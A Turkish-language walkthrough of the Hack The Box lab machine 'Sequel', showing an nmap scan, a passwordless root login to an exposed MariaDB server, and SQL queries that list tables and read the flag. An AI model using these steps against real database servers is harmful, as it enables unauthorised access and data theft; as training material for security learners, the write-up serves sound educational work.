---
glightbox: true
---

# Sequel

!!! info "Target IP Address"

    10.129.95.232

Hedef makine için Nmap taraması gerçekleştir:

```bash
sudo nmap 10.129.95.232 -sV -sC
```

```text title="Output" hl_lines="6"
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-21 23:30 +03
Nmap scan report for 10.129.95.232
Host is up (0.34s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 68
|   Capabilities flags: 63486
|   Some Capabilities: ConnectWithDatabase, ODBCClient, LongColumnFlag, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolOld, SupportsTransactions, FoundRows, Speaks41ProtocolNew, SupportsCompression, Support41Auth, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 216.00 seconds
```

MySQL ile hedefe `root` kullanıcısı olarak giriş yap (kullanıcı `root` olduğunda parola istenmez):

```bash
mysql -h 10.129.95.232 -u root
```

Mevcut veri tabanlarını görüntülemek için aşağıdaki komutu çalıştır:

```text
show databases;
```

Öncelikle `htb` isimli veri tabanını seç:

```text
use htb;
```

Mevcut tabloları görüntülemek için aşağıdaki komutu gir:

```text
show tables;
```

```text title="Output"
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.142 sec)
```

Aşağıdaki komut ile bayrağı ele geçir:

```sql
SELECT * FROM config WHERE name = 'flag';
```
